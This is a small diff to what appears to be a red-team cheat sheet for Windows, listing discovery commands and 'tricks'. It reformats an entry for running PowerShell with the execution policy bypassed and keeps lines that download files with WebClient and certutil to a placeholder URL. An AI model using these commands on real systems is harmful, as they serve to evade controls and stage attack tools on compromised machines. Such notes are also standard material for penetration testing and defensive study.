@@ -4,7 +4,7 @@
 
 - `/netonly`. For local operations, run as local user; for network operations, use the provided account.
 
-## discovery tactics for windows
+## discovery
 
 - `systeminfo`
 - `route print`. show routing table
@@ -21,13 +21,9 @@
 ## tricks
 
 ### run powershell command
-
-```
-powershell.exe -exec bypass -C "<COMMAND>"
-```
+- `powershell.exe -exec bypass -C "<COMMAND>"`
 
 ### download file
-
 - (powershell) `(New-Object System.Net.WebClient).DownloadFile(<URL>, <OUTPUT>)`.
 - (cmd) `certutil.exe -urlcache -f <URL>`
 
